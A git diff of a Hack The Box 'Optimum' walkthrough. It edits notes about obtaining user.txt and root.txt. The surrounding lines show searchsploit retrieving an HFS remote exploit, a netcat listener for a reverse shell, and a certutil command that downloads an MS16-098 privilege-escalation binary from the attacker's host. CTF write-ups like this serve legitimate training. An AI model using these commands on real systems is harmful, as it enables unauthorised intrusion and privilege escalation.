@@ -31,7 +31,8 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 41.25 seconds
 ```
 ## Delivery & Exploitation
-* Searchsploit for HFS exploit. Setup python SimpleHTTPServer and nc listener. Successfully obtain reverse shell.
+* Searchsploit for HFS exploit. Setup python SimpleHTTPServer and nc listener. 
+* Successfully obtain reverse shell. Obtained user.txt.
 ```
 kali@kali:~/HTB/optimum$ searchsploit hfs  
 kali@kali:~/HTB/optimum$ searchsploit -m windows/remote/39161.py
@@ -499,7 +500,7 @@ ons Privilege Escalation, PoC
 [*] done                                                                                                      
 ```
 
-* Tested MS16-135. Test [MS16-098 exploit](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe). Successfully Priv Esc.
+* Tested MS16-135. Test [MS16-098 exploit](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe). Successfully Priv Esc and obtained root.txt.
 ```
 C:\Users\kostas\Desktop>certutil -urlcache -split -f http://10.10.14.10/41020.exe C:\Users\kostas\Desktop\41020.exe
 
